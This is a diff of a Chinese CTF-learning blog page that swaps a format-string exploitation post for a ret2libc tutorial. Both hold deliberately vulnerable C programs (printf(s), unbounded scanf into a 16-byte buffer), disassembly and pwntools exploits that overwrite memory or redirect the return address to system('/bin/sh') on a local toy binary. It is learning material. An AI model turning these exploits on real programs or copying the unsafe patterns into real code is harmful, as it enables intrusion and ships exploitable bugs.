@@ -6,22 +6,18 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>PWN2 | ESE</title>
+  <title>PWN_x86—2_ret2blic | ESE</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN PWN从开始到开始–格式化字符串">
+  <meta name="description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN PWN从开始到开始–CTF中的简单ret2blic">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PWN2">
+<meta property="og:title" content="PWN_x86—2_ret2blic">
 <meta property="og:url" content="http://yoursite.com/2017/09/19/pwn2/index.html">
 <meta property="og:site_name" content="ESE">
-<meta property="og:description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN PWN从开始到开始–格式化字符串">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/006rgqhqgy1fjp192ut8dj306q06naak.jpg">
-<meta property="og:image" content="http://ww2.sinaimg.cn/large/006rgqhqgy1fjp1emgyl8j309r02r3y9.jpg">
-<meta property="og:image" content="http://ww2.sinaimg.cn/large/006rgqhqgy1fjp1fqmjamj30o807y77a.jpg">
-<meta property="og:updated_time" content="2017-09-19T10:18:46.464Z">
+<meta property="og:description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN PWN从开始到开始–CTF中的简单ret2blic">
+<meta property="og:updated_time" content="2017-10-05T09:43:04.178Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PWN2">
-<meta name="twitter:description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN PWN从开始到开始–格式化字符串">
-<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/006rgqhqgy1fjp192ut8dj306q06naak.jpg">
+<meta name="twitter:title" content="PWN_x86—2_ret2blic">
+<meta name="twitter:description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN PWN从开始到开始–CTF中的简单ret2blic">
   
   
     <link rel="icon" href="/favicon.png">
@@ -170,7 +166,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      PWN2
+      PWN_x86—2_ret2blic
     </h1>
   
 
@@ -184,16 +180,20 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>记录每天的进步，只有努力不会背叛自己！每天学习一点PWN</p>
-<h1 id="PWN从开始到开始–格式化字符串"><a href="#PWN从开始到开始–格式化字符串" class="headerlink" title="PWN从开始到开始–格式化字符串"></a>PWN从开始到开始–格式化字符串</h1><a id="more"></a>
-<h2 id="1、格式化字符串"><a href="#1、格式化字符串" class="headerlink" title="1、格式化字符串"></a>1、格式化字符串</h2><p>函数:<br>int printf(const char *format, [argument]);<br>printf()函数的调用格式为: printf(“&lt;格式化字符串&gt;”, &lt;参量表&gt;)。<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fjp192ut8dj306q06naak.jpg" alt=""></p>
-<p>基本的格式化字符串参数<br>%c：输出字符，配上%n可用于向指定地址写数据。<br>%d：输出十进制整数，配上%n可用于向指定地址写数据。<br>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。<br>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。<br>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。<br>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x10$n (%100d10$n)表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。<br>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</p>
-<h2 id="2、源码"><a href="#2、源码" class="headerlink" title="2、源码"></a>2、源码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line">int a = 123, b = 456;</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	int c = 789;</div><div class="line">	char s[100];</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;c);</div><div class="line">	scanf(<span class="string">"%s"</span>, s);</div><div class="line">	<span class="built_in">printf</span>(s);   //格式化，利用参数传递，打印出我们需要的地址</div><div class="line"><span class="keyword">if</span> (c == 16) </div><div class="line">&#123;</div><div class="line">	puts(<span class="string">"modified c."</span>);</div><div class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (a == 2) </div><div class="line">	&#123;</div><div class="line">	puts(<span class="string">"modified a for a small number."</span>);</div><div class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == 0x12345678)</div><div class="line">		&#123;</div><div class="line">			puts(<span class="string">"modified b for a big number!"</span>);</div><div class="line">		&#125;</div><div class="line">	<span class="built_in">return</span> 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>生成文件<br><code>gcc -m32 -no-pie -fno-stack-protector -z execstack -o fmt fmt.c</code></p>
-<h2 id="3、分析"><a href="#3、分析" class="headerlink" title="3、分析"></a>3、分析</h2><p>ida调试,因为a，b都是全局变量，找到a,b的地址<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fjp1emgyl8j309r02r3y9.jpg" alt=""><br>gdb调试<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fjp1fqmjamj30o807y77a.jpg" alt=""></p>
-<p>确定输入的是第6个参数</p>
-<h2 id="4、exp"><a href="#4、exp" class="headerlink" title="4、exp"></a>4、exp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">def ha():</div><div class="line">    p = process(<span class="string">'./fmt'</span>)</div><div class="line">    c_addr = int(p.recvuntil(<span class="string">'\n'</span>),16)</div><div class="line">    a_addr = 0x804A024</div><div class="line">    b_addr = 0x804A028</div><div class="line">    <span class="built_in">print</span> hex(c_addr)</div><div class="line">    raw_input()</div><div class="line">    payloadc = p32(c_addr)+<span class="string">'%12x'</span>+<span class="string">'%6$n'</span></div><div class="line">    payloada = <span class="string">'aa'</span>+<span class="string">'%8$n'</span>+<span class="string">'aa'</span>+p32(a_addr)</div><div class="line">    payloadb= p32(b_addr)+p32(b_addr+1)+p32(b_addr+2)+p32(b_addr+3)+<span class="string">'%104x'</span>+<span class="string">'%6$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%7$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%8$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%9$hhn'</span></div><div class="line">    p.sendline(payloadb)</div><div class="line">    <span class="built_in">print</span> p.recv()</div><div class="line">    p.interactive()</div><div class="line">ha()</div></pre></td></tr></table></figure>
-<p>这个exp解释一下：%12x表示填充12个字节。特别payloada的时候，%8$n是字符输入的，所以占4个字节，所以地址是在第8个参数，但是输出不会打印出来，所以下面的构造payloadb时候，%x$n不算在字节。</p>
-
+<h1 id="PWN从开始到开始–CTF中的简单ret2blic"><a href="#PWN从开始到开始–CTF中的简单ret2blic" class="headerlink" title="PWN从开始到开始–CTF中的简单ret2blic"></a>PWN从开始到开始–CTF中的简单ret2blic</h1><a id="more"></a>
+<h2 id="1、何为ret2blic"><a href="#1、何为ret2blic" class="headerlink" title="1、何为ret2blic"></a>1、何为ret2blic</h2><p>通过返回地址或者函数的plt跳到我们需要执行的函数，从而达到我们想要的，一般都是得到shell</p>
+<h2 id="2、源码"><a href="#2、源码" class="headerlink" title="2、源码"></a>2、源码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line"><span class="comment">#include &lt;string.h&gt;</span></div><div class="line"><span class="comment">#include &lt;unistd.h&gt;</span></div><div class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></div><div class="line">char *shell = <span class="string">"/bin/sh"</span>;</div><div class="line">void <span class="function"><span class="title">grant</span></span>() &#123;</div><div class="line">   system(<span class="string">"Good job"</span>);</div><div class="line">&#125;</div><div class="line">void <span class="function"><span class="title">exploitable</span></span>() &#123;</div><div class="line">   char buffer[16];</div><div class="line">   scanf(<span class="string">"%s"</span>, buffer);</div><div class="line">   <span class="keyword">if</span>(strcmp(buffer,<span class="string">"pwned"</span>) == 0) grant();</div><div class="line">   <span class="keyword">else</span>  puts(<span class="string">"Nice try\n"</span>);</div><div class="line">&#125;</div><div class="line">int <span class="function"><span class="title">main</span></span>()&#123;</div><div class="line">   exploitable();</div><div class="line">   <span class="built_in">return</span> 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>运行命令生成<br><code>gcc -m32 -no-pie -fno-stack-protector -z execstack -o pwn1 pwn1.c</code></p>
+<h2 id="3、漏洞原理，利用ret2blic技术"><a href="#3、漏洞原理，利用ret2blic技术" class="headerlink" title="3、漏洞原理，利用ret2blic技术"></a>3、漏洞原理，利用ret2blic技术</h2><p>ida打开，查看grant函数 汇编代码如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">.text:080484CB grant           proc near               ; CODE XREF: </div><div class="line">.text:080484CB</div><div class="line">.text:080484CB var_4           = dword ptr -4</div><div class="line">.text:080484CB</div><div class="line">.text:080484CB                 push    ebp</div><div class="line">.text:080484CC                 mov     ebp, esp</div><div class="line">.text:080484CE                 push    ebx</div><div class="line">.text:080484CF                 sub     esp, 4</div><div class="line">.text:080484D2                 call    __x86_get_pc_thunk_ax</div><div class="line">.text:080484D7                 add     eax, 1B29h</div><div class="line">.text:080484DC                 sub     esp, 0Ch</div><div class="line">.text:080484DF                 lea     edx, (aGoodJob - 804A000h)[eax] ; <span class="string">"Good job"</span></div><div class="line">.text:080484E5                 push    edx             ; <span class="built_in">command</span></div><div class="line">.text:080484E6                 mov     ebx, eax</div><div class="line">.text:080484E8                 call    _system</div><div class="line">.text:080484ED                 add     esp, 10h</div><div class="line">.text:080484F0                 nop</div><div class="line">.text:080484F1                 mov     ebx, [ebp+var_4]</div><div class="line">.text:080484F4                 leave</div><div class="line">.text:080484F5                 retn</div><div class="line">.text:080484F5 grant           endp</div></pre></td></tr></table></figure></p>
+<p>这里可以理解为<br><code>system(command)</code><br>最后ret，将保存的 函数返回地址从堆栈的顶部pop出值到EIP。<br>而我们想要得到shell，就得将command改为“bin/sh”，即<br><code>system(&quot;bin/sh&quot;)</code></p>
+<p>从ida我们看到“/bin/sh”的地址0x8048610<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">.rodata:08048610 aBinSh          db <span class="string">'/bin/sh'</span>,0          ; DATA XREF: .</div><div class="line">.rodata:08048618 aGoodJob        db <span class="string">'Good job'</span>,0         ; DATA XREF: </div><div class="line">.rodata:08048621 aS              db <span class="string">'%s'</span>,0               ; DATA XREF: </div><div class="line">.rodata:08048624 aPwned          db <span class="string">'pwned'</span>,0            ; DATA XREF: </div><div class="line">.rodata:0804862A aNiceTry        db <span class="string">'Nice try'</span>,0Ah,0     ; DATA XREF: </div><div class="line">.rodata:0804862A _rodata         ends</div></pre></td></tr></table></figure></p>
+<p>从ida我们看到system_plt的地址0x8048390<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">.plt:08048390 ; int system(const char *<span class="built_in">command</span>)</div><div class="line">.plt:08048390 _system         proc near               ; CODE XREF: </div><div class="line">.plt:08048390                 jmp     ds:off_804A014</div><div class="line">.plt:08048390 _system         endp</div></pre></td></tr></table></figure></p>
+<p>我们构造一个“假”的堆栈结构，然后修改函数的返回地址:</p>
+<p><code>payload=&#39;a&#39;*28+p32(system_plt)+p32(1)+p32(sh_addr)</code></p>
+<p>p32(system_plt):原函数的返回地址，这里改为我们要执行的system的地址<br>p32(1):system的返回地址，因为用不到，这里我随便填的。<br>p32(sh_addr):system的第一个参数，要执行字符串的地址，我们要拿到shell,就填’/bin/sh’的地址</p>
+<h2 id="4、exp"><a href="#4、exp" class="headerlink" title="4、exp"></a>4、exp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">p = process(<span class="string">'./pwn1'</span>)</div><div class="line"><span class="comment">#gdb.attach(p,'''break main''')</span></div><div class="line">system_plt=0x8048390</div><div class="line">sh_addr=0x8048610</div><div class="line">payload=<span class="string">'a'</span>*28+p32(system_plt)+p32(1)+p32(sh_addr)</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>记录一下字节走的坑：<br>后面发现system_plt等等许多plt是不能用ida看到出来的,上面也许是巧合<br>要写会用system_plt=elf.symbols[‘system’]</p>
+<h2 id="5、改善的exp"><a href="#5、改善的exp" class="headerlink" title="5、改善的exp"></a>5、改善的exp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">p = process(<span class="string">'./pwn1'</span>)</div><div class="line">elf = ELF(<span class="string">'pwn1'</span>)</div><div class="line">system_plt=elf.symbols[<span class="string">'system'</span>]</div><div class="line">sh_addr=0x8048610</div><div class="line">payload=<span class="string">'a'</span>*28+p32(system_plt)+p32(1)+p32(sh_addr)</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
       
 
       
@@ -291,11 +291,11 @@
   
 <nav id="article-nav">
   
-    <a href="/2017/09/20/ctf_start/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2017/09/19/pwn3/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          RE
+          PWN_x86—3_fmt
         
       </div>
     </a>
@@ -330,7 +330,7 @@
   
   <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="pwn2" data-title="PWN2" data-url="http://yoursite.com/2017/09/19/pwn2/"></div>
+	<div class="ds-thread" data-thread-key="pwn2" data-title="PWN_x86—2_ret2blic" data-url="http://yoursite.com/2017/09/19/pwn2/"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
